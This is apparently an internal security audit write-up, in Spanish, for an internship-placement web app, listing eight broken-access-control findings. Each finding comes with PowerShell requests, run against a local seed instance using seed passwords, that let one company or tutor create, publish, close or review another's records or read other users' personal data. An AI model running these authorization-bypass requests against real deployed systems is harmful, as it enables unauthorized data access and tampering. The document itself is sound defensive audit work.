# Pruebas de explotación — E3-01

Para cada hallazgo del inventario (`README.md`) hay un bloque aquí con:

- el comando ejecutable,
- la **respuesta literal** del servidor (capturada durante la auditoría),
- el veredicto y la severidad.

Todos los comandos fueron ejecutados contra el back levantado con el seed
del repo y devuelven el resultado que se muestra. Re-ejecutable con los
siguientes pasos.

## Cómo reproducir

```powershell
# 1) Postgres
docker compose up -d postgres

# 2) Reset + seed
pnpm exec prisma migrate reset --force --skip-seed
pnpm db:seed

# 3) Back (en otra terminal)
pnpm dev
```

El back escucha en `http://localhost:3000`. Todas las rutas llevan el
prefijo `/api`. Credenciales del seed (todas con password `yura1234`):

| Email | Rol | Notas |
|-------|-----|-------|
| `coordinador@miyura.com` | COORDINATOR | usuario id=1 |
| `empresa0@miyura.com` | COMPANY | dueña de offers con ids 1–3 (companyId=1) |
| `empresa4@miyura.com` | COMPANY | dueña de offers con ids 13–15 (companyId=5) |
| `estudiante0@miyura.com` | STUDENT | placement con id=1, tutorizado por tutor0 |
| `estudiante100@miyura.com` | STUDENT | sin placement previo |
| `tutor0@miyura.com` | TUTOR | tutor de placements con ids 0, 8, 16, ... |
| `tutor5@miyura.com` | TUTOR | tutor de placements con ids 5, 13, 21, ... |

Cada bloque obtiene el token correspondiente en la misma sesión de PowerShell.

---

## H-01 · `POST /api/offers` — COMPANY crea oferta para empresa ajena

**Severidad**: HIGH.

**Vector**: el `companyId` viene del DTO; el handler no sobreescribe
con `user.companyId`. Cualquier COMPANY puede crear ofertas para otras
empresas.

```powershell
$loginBody = @{
    email = "empresa0@miyura.com"
    password = "yura1234"
} | ConvertTo-Json

$loginResponse = Invoke-RestMethod `
    -Uri "http://localhost:3000/api/auth/login" `
    -Method POST `
    -ContentType "application/json" `
    -Body $loginBody

$TOK_E0 = $loginResponse.accessToken

$body = @{
    companyId = 5
    title = "Oferta infiltrada"
    description = "Pruebas"
    modality = "PRESENCIAL"
    seats = 1
    requiredHours = 240
    periodStart = "2026-09-01"
    periodEnd = "2026-12-31"
} | ConvertTo-Json

Invoke-RestMethod `
    -Uri "http://localhost:3000/api/offers" `
    -Method POST `
    -Headers @{
        Authorization = "Bearer $TOK_E0"
    } `
    -ContentType "application/json" `
    -Body $body
```

**Respuesta observada (status 200)**:

```json
{"id":37,"companyId":5,"title":"Oferta infiltrada","description":"Pruebas","modality":"PRESENCIAL","seats":1,"requiredHours":240,"periodStart":"2026-09-01T00:00:00.000Z","periodEnd":"2026-12-31T00:00:00.000Z","status":"DRAFT","publishedAt":null,"createdAt":"2026-09-25T14:58:18.215Z"}
```

**Veredicto**: `EXPLOTABLE`. La oferta `id=37` quedó persistida con
`companyId=5`, que es de `empresa4`. `empresa0` la creó pero no le
pertenece. Confirmado contra la base: `prisma offer findUnique({where:{id:37}})`
devuelve `companyId: 5`.

---

## H-02 · `PATCH /api/offers/:id/publish` — COMPANY publica oferta ajena

**Severidad**: HIGH.

**Vector**: usa la oferta H-01 (`id=37`, `companyId=5`, `status: DRAFT`).
`empresa0` la publica a pesar de no ser suya.

```powershell
Invoke-RestMethod `
    -Uri "http://localhost:3000/api/offers/37/publish" `
    -Method PATCH `
    -Headers @{
        Authorization = "Bearer $TOK_E0"
    }
```

**Respuesta observada (status 200)**:

```json
{"id":37,"companyId":5,"title":"Oferta infiltrada","description":"Pruebas","modality":"PRESENCIAL","seats":1,"requiredHours":240,"periodStart":"2026-09-01T00:00:00.000Z","periodEnd":"2026-12-31T00:00:00.000Z","status":"PUBLISHED","publishedAt":"2026-09-25T14:58:33.209Z","createdAt":"2026-09-25T14:58:18.215Z"}
```

**Veredicto**: `EXPLOTABLE`. La oferta pasó a `PUBLISHED` por una
company que no es la dueña.

---

## H-03 · `PATCH /api/offers/:id/close` — COMPANY cierra oferta ajena

**Severidad**: HIGH.

**Vector**: `empresa0` cierra una oferta `PUBLISHED` legítima de
`empresa4` (`id=13`).

```powershell
Invoke-RestMethod `
    -Uri "http://localhost:3000/api/offers/13/close" `
    -Method PATCH `
    -Headers @{
        Authorization = "Bearer $TOK_E0"
    }
```

**Respuesta observada (status 200)**:

```json
{"id":13,"companyId":5,"title":"Practicante Backend - Empresa 4","description":"Prácticas preprofesionales de 240 horas en modalidad presencial.","modality":"PRESENCIAL","seats":2,"requiredHours":240,"periodStart":"2026-03-01T00:00:00.000Z","periodEnd":"2026-07-31T00:00:00.000Z","status":"CLOSED","publishedAt":"2026-02-15T00:00:00.000Z","createdAt":"2026-09-25T14:21:42.319Z"}
```

**Veredicto**: `EXPLOTABLE`. Cierre malicioso por company ajena.

---

## H-04 · `GET /api/offers/:id` — usuario cualquiera ve PII de cualquier oferta

**Severidad**: MEDIUM.

**Vector**: `estudiante0` ve el detalle de la oferta `id=13` (de
`empresa4`), incluyendo `taxId` y `contactEmail` de la empresa. También
funciona para ofertas en `DRAFT`/`CLOSED` (no hay filtro por estado).

```powershell
$loginBody = @{
    email = "estudiante0@miyura.com"
    password = "yura1234"
} | ConvertTo-Json

$loginResponse = Invoke-RestMethod `
    -Uri "http://localhost:3000/api/auth/login" `
    -Method POST `
    -ContentType "application/json" `
    -Body $loginBody

$TOK_S0 = $loginResponse.accessToken

Invoke-RestMethod `
    -Uri "http://localhost:3000/api/offers/13" `
    -Method GET `
    -Headers @{
        Authorization = "Bearer $TOK_S0"
    }
```

**Respuesta observada (status 200)**:

```json
{"id":13,"companyId":5,"title":"Practicante Backend - Empresa 4","description":"...","modality":"PRESENCIAL","seats":2,"requiredHours":240,"periodStart":"2026-03-01T00:00:00.000Z","periodEnd":"2026-07-31T00:00:00.000Z","status":"CLOSED","publishedAt":"2026-02-15T00:00:00.000Z","createdAt":"2026-09-25T14:21:42.319Z","company":{"id":5,"taxId":"1790000004001","name":"Empresa 4","sector":"Software","contactEmail":"rrhh@empresa4.com","verified":true,"createdAt":"2026-09-25T14:21:42.271Z"}}
```

**Veredicto**: `EXPLOTABLE`. Filtra por exposición de PII (`taxId`,
`contactEmail`) a cualquier usuario autenticado, incluyendo `STUDENT`.

---

## H-05 · `GET /api/offers/:offerId/applications` — COMPANY ve postulaciones de oferta ajena

**Severidad**: HIGH.

**Vector**: `empresa0` lista las postulaciones de la oferta `id=13`
(de `empresa4`). Devuelve 6 postulaciones con email y fullName de los
estudiantes.

```powershell
Invoke-RestMethod `
    -Uri "http://localhost:3000/api/offers/13/applications" `
    -Method GET `
    -Headers @{
        Authorization = "Bearer $TOK_E0"
    }
```

**Respuesta observada (status 200, abreviada)**:

```json
[
  {"id":13,"offerId":13,"studentId":34,"status":"ACCEPTED","motivation":"...","submittedAt":"...","decidedAt":"...","student":{"id":34,"email":"estudiante12@miyura.com","fullName":"Estudiante 12"}},
  {"id":49,"offerId":13,"studentId":70,"status":"ACCEPTED","motivation":"...","submittedAt":"...","decidedAt":"...","student":{"id":70,"email":"estudiante48@miyura.com","fullName":"Estudiante 48"}},
  {"id":85,"offerId":13,"studentId":106,"status":"ACCEPTED","motivation":"...","submittedAt":"...","decidedAt":"...","student":{"id":106,"email":"estudiante84@miyura.com","fullName":"Estudiante 84"}},
  {"id":121,"offerId":13,"studentId":142,"status":"ACCEPTED","motivation":"...","submittedAt":"...","decidedAt":"...","student":{"id":142,"email":"estudiante120@miyura.com","fullName":"Estudiante 120"}},
  {"id":157,"offerId":13,"studentId":178,"status":"ACCEPTED","motivation":"...","submittedAt":"...","decidedAt":"...","student":{"id":178,"email":"estudiante156@miyura.com","fullName":"Estudiante 156"}},
  {"id":193,"offerId":13,"studentId":214,"status":"ACCEPTED","motivation":"...","submittedAt":"...","decidedAt":"...","student":{"id":214,"email":"estudiante192@miyura.com","fullName":"Estudiante 192"}}
]
```

**Veredicto**: `EXPLOTABLE`. Exposición de PII de estudiantes +
información de negocio de otra empresa.

---

## H-06 · `PATCH /api/applications/:id/decide` — COMPANY decide postulación de oferta ajena

**Severidad**: HIGH.

**Vector**: el seed genera las applications en `ACCEPTED`, por lo que
no se puede cambiar de estado. Hay que crear una nueva en `SUBMITTED`
primero, y luego `empresa0` la rechaza.

```powershell
$loginBody = @{
    email = "estudiante100@miyura.com"
    password = "yura1234"
} | ConvertTo-Json

$loginResponse = Invoke-RestMethod `
    -Uri "http://localhost:3000/api/auth/login" `
    -Method POST `
    -ContentType "application/json" `
    -Body $loginBody

$TOK_S100 = $loginResponse.accessToken

$applicationBody = @{
    offerId = 13
    motivation = "Prueba de seguridad E3-01"
} | ConvertTo-Json

$applicationResponse = Invoke-RestMethod `
    -Uri "http://localhost:3000/api/applications" `
    -Method POST `
    -Headers @{
        Authorization = "Bearer $TOK_S100"
    } `
    -ContentType "application/json" `
    -Body $applicationBody

$APP_ID = $applicationResponse.id

$decisionBody = @{
    status = "REJECTED"
} | ConvertTo-Json

Invoke-RestMethod `
    -Uri "http://localhost:3000/api/applications/$APP_ID/decide" `
    -Method PATCH `
    -Headers @{
        Authorization = "Bearer $TOK_E0"
    } `
    -ContentType "application/json" `
    -Body $decisionBody
```

**Respuestas observadas**:

Paso 1 (status 200):

```json
{"id":201,"offerId":13,"studentId":213,"status":"SUBMITTED","motivation":"Prueba de seguridad E3-01","submittedAt":"2026-09-25T14:58:49.836Z","decidedAt":null}
```

Paso 2 (status 200):

```json
{"id":201,"offerId":13,"studentId":213,"status":"REJECTED","motivation":"Prueba de seguridad E3-01","submittedAt":"2026-09-25T14:58:49.836Z","decidedAt":"2026-09-25T14:58:49.988Z"}
```

**Veredicto**: `EXPLOTABLE`. `empresa0` rechazó una postulación a una
oferta que no es suya. En producción esto significa que cualquier
COMPANY puede sabotear procesos de selección de otras companies.

---

## H-07 · `PATCH /api/hour-logs/:id/review` — TUTOR revisa hour-logs de OTRO tutor

**Severidad**: **CRITICAL**.

**Vector**: el handler solo valida que el hour-log esté en `SUBMITTED`.
No compara `placement.tutorId === user.id`. `tutor0` revisa un
hour-log cuyo placement es tutorizado por `tutor5`.

```powershell
$loginBody = @{
    email = "tutor0@miyura.com"
    password = "yura1234"
} | ConvertTo-Json

$loginResponse = Invoke-RestMethod `
    -Uri "http://localhost:3000/api/auth/login" `
    -Method POST `
    -ContentType "application/json" `
    -Body $loginBody

$TOK_T0 = $loginResponse.accessToken

$reviewBody = @{
    status = "REJECTED"
    note = "Auditoria E3-01"
} | ConvertTo-Json

Invoke-RestMethod `
    -Uri "http://localhost:3000/api/hour-logs/136/review" `
    -Method PATCH `
    -Headers @{
        Authorization = "Bearer $TOK_T0"
    } `
    -ContentType "application/json" `
    -Body $reviewBody
```

**Respuesta observada (status 200)**:

```json
{"id":136,"placementId":6,"date":"2026-03-02T00:00:00.000Z","startTime":"08:00","endTime":"12:00","hours":4,"activity":"Actividad 15: soporte y desarrollo","status":"REJECTED","reviewedById":2,"reviewedAt":"2026-09-25T14:58:55.221Z","reviewNote":"Auditoria E3-01","version":1}
```

**Veredicto**: `EXPLOTABLE`. `reviewedById=2` corresponde a `tutor0`,
pero el placement 6 lo tutoriza `tutor5`. **Esto compromete la
integridad de la evaluación académica**: cualquier tutor puede aprobar
o rechazar horas de placements que no son suyos, lo que afecta el
cómputo final de horas acreditadas.

---

## H-08 · `GET /api/companies` — usuario autenticado lista TODAS las empresas con RUC y email

**Severidad**: MEDIUM.

**Vector**: `estudiante0` (y cualquier usuario autenticado) llama a
`GET /api/companies` y recibe la lista completa de las 12 empresas,
incluyendo `taxId` (RUC) y `contactEmail`.

```powershell
Invoke-RestMethod `
    -Uri "http://localhost:3000/api/companies" `
    -Method GET `
    -Headers @{
        Authorization = "Bearer $TOK_S0"
    }
```

**Respuesta observada (status 200, primeras 3 entradas)**:

```json
[
  {"id":1,"taxId":"1790000000001","name":"Empresa 0","sector":"Software","contactEmail":"rrhh@empresa0.com","verified":false,"createdAt":"..."},
  {"id":2,"taxId":"1790000001001","name":"Empresa 1","sector":"Manufactura","contactEmail":"rrhh@empresa1.com","verified":true,"createdAt":"..."},
  {"id":3,"taxId":"1790000002001","name":"Empresa 2","sector":"Salud","contactEmail":"rrhh@empresa2.com","verified":true,"createdAt":"..."}
]
```

Total devuelto: **12 empresas** con `taxId` y `contactEmail` completos.

**Veredicto**: `EXPLOTABLE`. Exposición innecesaria de PII/RUC a
usuarios que no necesitan esa información. El endpoint solo lo usa
`CompanyOffersPage` para el header de la empresa del usuario logueado;
un STUDENT logueado que abre DevTools lo ve todo.

---

## Resumen

| H | Endpoint | Status | Veredicto | Severidad |
|---|----------|--------|-----------|-----------|
| H-01 | `POST /api/offers` | 200 | EXPLOTABLE | HIGH |
| H-02 | `PATCH /api/offers/:id/publish` | 200 | EXPLOTABLE | HIGH |
| H-03 | `PATCH /api/offers/:id/close` | 200 | EXPLOTABLE | HIGH |
| H-04 | `GET /api/offers/:id` | 200 | EXPLOTABLE | MEDIUM |
| H-05 | `GET /api/offers/:offerId/applications` | 200 | EXPLOTABLE | HIGH |
| H-06 | `PATCH /api/applications/:id/decide` | 200 | EXPLOTABLE | HIGH |
| H-07 | `PATCH /api/hour-logs/:id/review` | 200 | EXPLOTABLE | **CRITICAL** |
| H-08 | `GET /api/companies` | 200 | EXPLOTABLE | MEDIUM |

**8 de 8 confirmados con respuesta 200 del servidor.** La remediación
vive en `hallazgos/H-NN.md` (PR 3).